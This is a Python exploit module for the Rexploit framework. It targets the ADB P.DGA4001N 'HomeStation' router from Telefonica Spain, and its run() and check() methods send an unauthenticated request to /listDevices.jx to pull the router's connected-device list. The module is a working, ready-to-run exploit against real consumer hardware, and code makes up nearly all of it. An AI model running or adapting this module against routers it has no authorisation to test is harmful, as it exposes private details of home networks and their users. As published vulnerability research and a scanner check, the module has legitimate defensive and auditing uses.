import requests


from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="HomeStation devices information disclosure",
            category="disclosure",
            authors={
                "Vulnerability discovery": "vicendominguez",
                "Rexploit module": "Daniel Diez"
            },
            targets=[
                "ADB P.DGA4001N aka (HomeStation)"
            ],
            date="23/04/2016",
            cwe="CWE-200: Information Exposure",
            description="Script to detect disclosure information vulnerability from ADB P.DGA4001N aka (HomeStation) Telefonica Spain.The vulnerability exist in the web interface, which is  accessible without authentication. ",
            references={
                "https://github.com/DaniLabs/scripts-nse/": "GitHub Scripts NSE"
            }
        )

    def default(self):
        data = {"url": "/listDevices.jx"}

        return data

    def run(self, data):
        url = data["url"]
        url = "http://{0}{1}".format(self.getIP(), url)

        try:
            response = requests.get(url)

            if response.content:
                message = response.content
            else:
                message = "Error"

            return message

        except requests.ConnectionError:
            return None

    def check(self):
        data = self.default()
        url = data["url"]

        url = "http://{0}{1}".format(self.getIP(), url)

        try:
            r = requests.get(url)

            if r.status_code == 200:
                return True
            else:
                return False
        except requests.ConnectionError:
            return None
